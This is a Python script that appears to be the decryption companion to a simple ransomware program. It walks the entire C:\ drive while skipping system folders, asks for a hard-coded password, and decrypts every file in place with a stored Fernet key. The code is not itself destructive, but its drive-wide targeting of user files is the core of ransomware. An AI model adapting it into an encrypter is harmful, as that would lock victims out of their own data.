import os
from cryptography.fernet import Fernet

root_dir = "C:\\"


def decrypt_all_files(root_dir):
    all_files = []
    excluded_dir = ["System32", "Windows", "Program Files", "AppData"]

    for dirpath, dirnames, filenames in os.walk(root_dir):
        #Exclude some directories
        dirnames[:] = [d for d in dirnames if d not in excluded_dir]

        for filename in filenames:
            full_path = os.path.join(dirpath, filename)
            if full_path.endswith(("decrypter.py", "encrypter.py", ".git", "TheKey.key")):
                continue
            all_files.append(full_path)
    return all_files

files = decrypt_all_files(root_dir)

#We need the previous key to decrypt the files. 
with open("TheKey.key", "rb") as key:
    secretKey = key.read()

secretWord = "marimba"
userInput = input("Enter the password to unlock the content:\n")

if secretWord == userInput:
    for file in files:
        with open(file, 'rb') as theFile:
            contentOfFiles = theFile.read()
        #Decrypt data
        decryptedContent = Fernet(secretKey).decrypt(contentOfFiles)

        with open(file, "wb") as theFile:
            theFile.write(decryptedContent)
    print("Your files have been decrypted")

else:
    print("wrong password")
    
